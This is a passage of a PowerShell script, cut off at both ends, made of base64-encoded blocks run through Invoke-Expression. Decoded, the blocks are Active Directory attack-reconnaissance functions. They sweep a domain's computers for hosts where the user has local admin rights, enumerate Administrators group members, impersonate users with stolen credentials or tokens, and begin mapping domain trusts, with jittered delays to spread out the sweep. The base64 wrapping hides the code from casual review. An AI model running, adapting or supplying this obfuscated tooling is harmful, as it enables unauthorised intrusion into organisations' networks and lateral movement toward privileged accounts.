gICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJTZXJ2aWNlUGFjayddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydTZXJ2aWNlUGFjayddID0gJFNlcnZpY2VQYWNrIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlclNpdGVOYW1lJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NpdGVOYW1lJ10gPSAkU2l0ZU5hbWUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyTmFtZSddKSB7CiAgICAgICAgICAgICRUYXJnZXRDb21wdXRlcnMgPSAkQ29tcHV0ZXJOYW1lCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICdbRmluZC1Mb2NhbEFkbWluQWNjZXNzXSBRdWVyeWluZyBjb21wdXRlcnMgaW4gdGhlIGRvbWFpbicKICAgICAgICAgICAgJFRhcmdldENvbXB1dGVycyA9IEdldC1Eb21haW5Db21wdXRlciBAQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50cyB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IGRuc2hvc3RuYW1lCiAgICAgICAgfQogICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLUxvY2FsQWRtaW5BY2Nlc3NdIFRhcmdldENvbXB1dGVycyBsZW5ndGg6ICQoJFRhcmdldENvbXB1dGVycy5MZW5ndGgpIgogICAgICAgIGlmICgkVGFyZ2V0Q29tcHV0ZXJzLkxlbmd0aCAtZXEgMCkgewogICAgICAgICAgICB0aHJvdyAnW0ZpbmQtTG9jYWxBZG1pbkFjY2Vzc10gTm8gaG9zdHMgZm91bmQgdG8gZW51bWVyYXRlJwogICAgICAgIH0KICAgICAgICAkSG9zdEVudW1CbG9jayA9IHsKICAgICAgICAgICAgUGFyYW0oJENvbXB1dGVyTmFtZSwgJFRva2VuSGFuZGxlKQogICAgICAgICAgICBpZiAoJFRva2VuSGFuZGxlKSB7CiAgICAgICAgICAgICAgICAkTnVsbCA9IEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiAtVG9rZW5IYW5kbGUgJFRva2VuSGFuZGxlIC1RdWlldAogICAgICAgICAgICB9CiAgICAgICAgICAgIEZvckVhY2ggKCRUYXJnZXRDb21wdXRlciBpbiAkQ29tcHV0ZXJOYW1lKSB7CiAgICAgICAgICAgICAgICAkVXAgPSBUZXN0LUNvbm5lY3Rpb24gLUNvdW50IDEgLVF1aWV0IC1Db21wdXRlck5hbWUgJFRhcmdldENvbXB1dGVyCiAgICAgICAgICAgICAgICBpZiAoJFVwKSB7CiAgICAgICAgICAgICAgICAgICAgJEFjY2VzcyA9IFRlc3QtQWRtaW5BY2Nlc3MgLUNvbXB1dGVyTmFtZSAkVGFyZ2V0Q29tcHV0ZXIKICAgICAgICAgICAgICAgICAgICBpZiAoJEFjY2Vzcy5Jc0FkbWluKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRUYXJnZXRDb21wdXRlcgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFRva2VuSGFuZGxlKSB7CiAgICAgICAgICAgICAgICBJbnZva2UtUmV2ZXJ0VG9TZWxmCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgJExvZ29uVG9rZW4gPSAkTnVsbAogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgewogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEZWxheSddIC1vciAkUFNCb3VuZFBhcmFtZXRlcnNbJ1N0b3BPblN1Y2Nlc3MnXSkgewogICAgICAgICAgICAgICAgJExvZ29uVG9rZW4gPSBJbnZva2UtVXNlckltcGVyc29uYXRpb24gLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRMb2dvblRva2VuID0gSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIC1DcmVkZW50aWFsICRDcmVkZW50aWFsIC1RdWlldAogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQogICAgUFJPQ0VTUyB7CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRGVsYXknXSAtb3IgJFBTQm91bmRQYXJhbWV0ZXJzWydTdG9wT25TdWNjZXNzJ10pIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtTG9jYWxBZG1pbkFjY2Vzc10gVG90YWwgbnVtYmVyIG9mIGhvc3RzOiAkKCRUYXJnZXRDb21wdXRlcnMuY291bnQpIgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1Mb2NhbEFkbWluQWNjZXNzXSBEZWxheTogJERlbGF5LCBKaXR0ZXI6ICRKaXR0ZXIiCiAgICAgICAgICAgICRDb3VudGVyID0gMAogICAgICAgICAgICAkUmFuZE5vID0gTmV3LU9iamVjdCBTeXN0ZW0uUmFuZG9tCiAgICAgICAgICAgIEZvckVhY2ggKCRUYXJnZXRDb21wdXRlciBpbiAkVGFyZ2V0Q29tcHV0ZXJzKSB7CiAgICAgICAgICAgICAgICAkQ291bnRlciA9ICRDb3VudGVyICsgMQogICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgJFJhbmROby5OZXh0KCgxLSRKaXR0ZXIpKiREZWxheSwgKDErJEppdHRlcikqJERlbGF5KQogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtTG9jYWxBZG1pbkFjY2Vzc10gRW51bWVyYXRpbmcgc2VydmVyICRUYXJnZXRDb21wdXRlciAoJENvdW50ZXIgb2YgJCgkVGFyZ2V0Q29tcHV0ZXJzLmNvdW50KSkiCiAgICAgICAgICAgICAgICBJbnZva2UtQ29tbWFuZCAtU2NyaXB0QmxvY2sgJEhvc3RFbnVtQmxvY2sgLUFyZ3VtZW50TGlzdCAkVGFyZ2V0Q29tcHV0ZXIsICRMb2dvblRva2VuCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLUxvY2FsQWRtaW5BY2Nlc3NdIFVzaW5nIHRocmVhZGluZyB3aXRoIHRocmVhZHM6ICRUaHJlYWRzIgogICAgICAgICAgICAkU2NyaXB0UGFyYW1zID0gQHsKICAgICAgICAgICAgICAgICdUb2tlbkhhbmRsZScgPSAkTG9nb25Ub2tlbgogICAgICAgICAgICB9CiAgICAgICAgICAgIE5ldy1UaHJlYWRlZEZ1bmN0aW9uIC1Db21wdXRlck5hbWUgJFRhcmdldENvbXB1dGVycyAtU2NyaXB0QmxvY2sgJEhvc3RFbnVtQmxvY2sgLVNjcmlwdFBhcmFtZXRlcnMgJFNjcmlwdFBhcmFtcyAtVGhyZWFkcyAkVGhyZWFkcwogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gRmluZC1Eb21haW5Mb2NhbEdyb3VwTWVtYmVyIHsKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LkxvY2FsR3JvdXBNZW1iZXIuQVBJJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LkxvY2FsR3JvdXBNZW1iZXIuV2luTlQnKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnRE5TSG9zdE5hbWUnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJENvbXB1dGVyTmFtZSwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyRG9tYWluLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJMREFQRmlsdGVyLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJTZWFyY2hCYXNlLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdPcGVyYXRpbmdTeXN0ZW0nKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlck9wZXJhdGluZ1N5c3RlbSwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnU2VydmljZVBhY2snKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlclNlcnZpY2VQYWNrLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdTaXRlTmFtZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyU2l0ZU5hbWUsCiAgICAgICAgW1BhcmFtZXRlcihWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkR3JvdXBOYW1lID0gJ0FkbWluaXN0cmF0b3JzJywKICAgICAgICBbVmFsaWRhdGVTZXQoJ0FQSScsICdXaW5OVCcpXQogICAgICAgIFtBbGlhcygnQ29sbGVjdGlvbk1ldGhvZCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJE1ldGhvZCA9ICdBUEknLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eSwKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkRGVsYXkgPSAwLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDAuMCwgMS4wKV0KICAgICAgICBbRG91YmxlXQogICAgICAgICRKaXR0ZXIgPSAuMywKICAgICAgICBbSW50XQogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMCldCiAgICAgICAgJFRocmVhZHMgPSAyMAogICAgKQogICAgQkVHSU4gewogICAgICAgICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzID0gQHsKICAgICAgICAgICAgJ1Byb3BlcnRpZXMnID0gJ2Ruc2hvc3RuYW1lJwogICAgICAgIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlckRvbWFpbiddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICRDb21wdXRlckRvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJMREFQRmlsdGVyJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ0xEQVBGaWx0ZXInXSA9ICRDb21wdXRlckxEQVBGaWx0ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyU2VhcmNoQmFzZSddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkQ29tcHV0ZXJTZWFyY2hCYXNlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydVbmNvbnN0cmFpbmVkJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1VuY29uc3RyYWluZWQnXSA9ICRVbmNvbnN0cmFpbmVkIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlck9wZXJhdGluZ1N5c3RlbSddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydPcGVyYXRpbmdTeXN0ZW0nXSA9ICRPcGVyYXRpbmdTeXN0ZW0gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyU2VydmljZVBhY2snXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snU2VydmljZVBhY2snXSA9ICRTZXJ2aWNlUGFjayB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJTaXRlTmFtZSddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydTaXRlTmFtZSddID0gJFNpdGVOYW1lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlck5hbWUnXSkgewogICAgICAgICAgICAkVGFyZ2V0Q29tcHV0ZXJzID0gJENvbXB1dGVyTmFtZQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnW0ZpbmQtRG9tYWluTG9jYWxHcm91cE1lbWJlcl0gUXVlcnlpbmcgY29tcHV0ZXJzIGluIHRoZSBkb21haW4nCiAgICAgICAgICAgICRUYXJnZXRDb21wdXRlcnMgPSBHZXQtRG9tYWluQ29tcHV0ZXIgQENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHMgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBkbnNob3N0bmFtZQogICAgICAgIH0KICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1Eb21haW5Mb2NhbEdyb3VwTWVtYmVyXSBUYXJnZXRDb21wdXRlcnMgbGVuZ3RoOiAkKCRUYXJnZXRDb21wdXRlcnMuTGVuZ3RoKSIKICAgICAgICBpZiAoJFRhcmdldENvbXB1dGVycy5MZW5ndGggLWVxIDApIHsKICAgICAgICAgICAgdGhyb3cgJ1tGaW5kLURvbWFpbkxvY2FsR3JvdXBNZW1iZXJdIE5vIGhvc3RzIGZvdW5kIHRvIGVudW1lcmF0ZScKICAgICAgICB9CiAgICAgICAgJEhvc3RFbnVtQmxvY2sgPSB7CiAgICAgICAgICAgIFBhcmFtKCRDb21wdXRlck5hbWUsICRHcm91cE5hbWUsICRNZXRob2QsICRUb2tlbkhhbmRsZSkKICAgICAgICAgICAgaWYgKCRHcm91cE5hbWUgLWVxICJBZG1pbmlzdHJhdG9ycyIpIHsKICAgICAgICAgICAgICAgICRBZG1pblNlY3VyaXR5SWRlbnRpZmllciA9IE5ldy1PYmplY3QgU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5TZWN1cml0eUlkZW50aWZpZXIoW1N5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuV2VsbEtub3duU2lkVHlwZV06OkJ1aWx0aW5BZG1pbmlzdHJhdG9yc1NpZCwkbnVsbCkKICAgICAgICAgICAgICAgICRHcm91cE5hbWUgPSAoJEFkbWluU2VjdXJpdHlJZGVudGlmaWVyLlRyYW5zbGF0ZShbU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5OVEFjY291bnRdKS5WYWx1ZSAtc3BsaXQgIlxcIilbLTFdCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRUb2tlbkhhbmRsZSkgewogICAgICAgICAgICAgICAgJE51bGwgPSBJbnZva2UtVXNlckltcGVyc29uYXRpb24gLVRva2VuSGFuZGxlICRUb2tlbkhhbmRsZSAtUXVpZXQKICAgICAgICAgICAgfQogICAgICAgICAgICBGb3JFYWNoICgkVGFyZ2V0Q29tcHV0ZXIgaW4gJENvbXB1dGVyTmFtZSkgewogICAgICAgICAgICAgICAgJFVwID0gVGVzdC1Db25uZWN0aW9uIC1Db3VudCAxIC1RdWlldCAtQ29tcHV0ZXJOYW1lICRUYXJnZXRDb21wdXRlcgogICAgICAgICAgICAgICAgaWYgKCRVcCkgewogICAgICAgICAgICAgICAgICAgICROZXRMb2NhbEdyb3VwTWVtYmVyQXJndW1lbnRzID0gQHsKICAgICAgICAgICAgICAgICAgICAgICAgJ0NvbXB1dGVyTmFtZScgPSAkVGFyZ2V0Q29tcHV0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgJ01ldGhvZCcgPSAkTWV0aG9kCiAgICAgICAgICAgICAgICAgICAgICAgICdHcm91cE5hbWUnID0gJEdyb3VwTmFtZQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBHZXQtTmV0TG9jYWxHcm91cE1lbWJlciBATmV0TG9jYWxHcm91cE1lbWJlckFyZ3VtZW50cwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkVG9rZW5IYW5kbGUpIHsKICAgICAgICAgICAgICAgIEludm9rZS1SZXZlcnRUb1NlbGYKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAkTG9nb25Ub2tlbiA9ICROdWxsCiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RlbGF5J10gLW9yICRQU0JvdW5kUGFyYW1ldGVyc1snU3RvcE9uU3VjY2VzcyddKSB7CiAgICAgICAgICAgICAgICAkTG9nb25Ub2tlbiA9IEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbAogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgJExvZ29uVG9rZW4gPSBJbnZva2UtVXNlckltcGVyc29uYXRpb24gLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwgLVF1aWV0CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEZWxheSddIC1vciAkUFNCb3VuZFBhcmFtZXRlcnNbJ1N0b3BPblN1Y2Nlc3MnXSkgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1Eb21haW5Mb2NhbEdyb3VwTWVtYmVyXSBUb3RhbCBudW1iZXIgb2YgaG9zdHM6ICQoJFRhcmdldENvbXB1dGVycy5jb3VudCkiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLURvbWFpbkxvY2FsR3JvdXBNZW1iZXJdIERlbGF5OiAkRGVsYXksIEppdHRlcjogJEppdHRlciIKICAgICAgICAgICAgJENvdW50ZXIgPSAwCiAgICAgICAgICAgICRSYW5kTm8gPSBOZXctT2JqZWN0IFN5c3RlbS5SYW5kb20KICAgICAgICAgICAgRm9yRWFjaCAoJFRhcmdldENvbXB1dGVyIGluICRUYXJnZXRDb21wdXRlcnMpIHsKICAgICAgICAgICAgICAgICRDb3VudGVyID0gJENvdW50ZXIgKyAxCiAgICAgICAgICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAkUmFuZE5vLk5leHQoKDEtJEppdHRlcikqJERlbGF5LCAoMSskSml0dGVyKSokRGVsYXkpCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1Eb21haW5Mb2NhbEdyb3VwTWVtYmVyXSBFbnVtZXJhdGluZyBzZXJ2ZXIgJFRhcmdldENvbXB1dGVyICgkQ291bnRlciBvZiAkKCRUYXJnZXRDb21wdXRlcnMuY291bnQpKSIKICAgICAgICAgICAgICAgIEludm9rZS1Db21tYW5kIC1TY3JpcHRCbG9jayAkSG9zdEVudW1CbG9jayAtQXJndW1lbnRMaXN0ICRUYXJnZXRDb21wdXRlciwgJEdyb3VwTmFtZSwgJE1ldGhvZCwgJExvZ29uVG9rZW4KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtRG9tYWluTG9jYWxHcm91cE1lbWJlcl0gVXNpbmcgdGhyZWFkaW5nIHdpdGggdGhyZWFkczogJFRocmVhZHMiCiAgICAgICAgICAgICRTY3JpcHRQYXJhbXMgPSBAewogICAgICAgICAgICAgICAgJ0dyb3VwTmFtZScgPSAkR3JvdXBOYW1lCiAgICAgICAgICAgICAgICAnTWV0aG9kJyA9ICRNZXRob2QKICAgICAgICAgICAgICAgICdUb2tlbkhhbmRsZScgPSAkTG9nb25Ub2tlbgogICAgICAgICAgICB9CiAgICAgICAgICAgIE5ldy1UaHJlYWRlZEZ1bmN0aW9uIC1Db21wdXRlck5hbWUgJFRhcmdldENvbXB1dGVycyAtU2NyaXB0QmxvY2sgJEhvc3RFbnVtQmxvY2sgLVNjcmlwdFBhcmFtZXRlcnMgJFNjcmlwdFBhcmFtcyAtVGhyZWFkcyAkVGhyZWFkcwogICAgICAgIH0KICAgIH0KICAgIEVORCB7CiAgICAgICAgaWYgKCRMb2dvblRva2VuKSB7CiAgICAgICAgICAgIEludm9rZS1SZXZlcnRUb1NlbGYgLVRva2VuSGFuZGxlICRMb2dvblRva2VuCiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpblRydXN0IHsKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LkRvbWFpblRydXN0Lk5FVCcpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Eb21haW5UcnVzdC5MREFQJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LkRvbWFpblRydXN0LkFQSScpXQogICAgW0NtZGxldEJpbmRpbmcoRGVmYXVsdFBhcmFtZXRlclNldE5hbWUgPSAnTERBUCcpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdOYW1lJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0FQSScpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEFQSSwKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnTkVUJyldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkTkVULAogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdMREFQJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0ZpbHRlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJExEQVBGaWx0ZXIsCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0xEQVAnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkUHJvcGVydGllcywKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnTERBUCcpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdBRFNQYXRoJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoQmFzZSwKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnTERBUCcpXQogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdBUEknKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnTERBUCcpXQogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCiAgICAgICAgW1BhcmFtZXRlcihQYXJhb